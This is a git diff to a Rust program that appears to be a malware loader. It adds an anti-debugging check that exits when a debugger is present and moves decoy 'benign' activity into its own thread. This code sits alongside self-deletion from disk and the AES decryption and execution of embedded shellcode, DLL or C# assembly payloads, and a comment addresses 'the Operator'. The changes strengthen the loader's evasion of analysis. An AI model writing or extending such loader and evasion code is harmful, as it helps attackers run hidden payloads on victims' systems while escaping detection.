@@ -1,8 +1,12 @@
 use std::ffi::c_void;
 mod execution;
+mod benign;
 
 #[cfg(feature = "UtilitySelfDeletion")]
 mod utilities;
+
+#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags"))]
+mod checks;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 use std::env;
@@ -96,32 +100,34 @@ fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
 
 fn main() {
 
+    // Anti-debug checks - runs all enabled checks
+    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags"))]
+    {
+        if checks::checks::run_all_checks() {
+            std::process::exit(1);
+        }
+    }
+
     #[cfg(feature = "UtilitySelfDeletion")]
     {
         let _ = utilities::utils::delete_self_from_disk();
     }
 
-    /*
-    For the Operator -> Write some benign code that is to be executed (Optional)
-     */
-
         // Validate AES arguments FIRST if AES encryption is enabled
         #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
         let (aes_key, aes_iv) = parse_and_validate_aes_args();
 
-        //Benign Stuff
-        #[cfg(feature = "calculation")]
-        fn calculate()
-        {
-            let mut result = 0;
-            for i in 0..10000 {
-                result += i;
-            }
-            println!("Result: {}", result);
-        }
-        #[cfg(feature = "calculation")]
-        calculate();
+        // =======================================================================
+        // Benign Stuff
+        // Don't add more stuff here, put it in benign.rs
+        // =======================================================================
 
+        benign::start_benign_thread();
+
+        // =======================================================================
+        // Benign Stuff ends
+        // =======================================================================
+        
         // Execute shellcode or payload without AES decryption
         #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
         {
@@ -361,8 +367,6 @@ fn main() {
                     // Do dll stuff
                 } else if ENCTYPE == "CSHARP_ASSEMBLY" {
                    // Do assembly stuff
-                } else {
-                    eprintln!("[-] Unknown embedded payload type: {}", ENCTYPE);
                 }
             }
         }
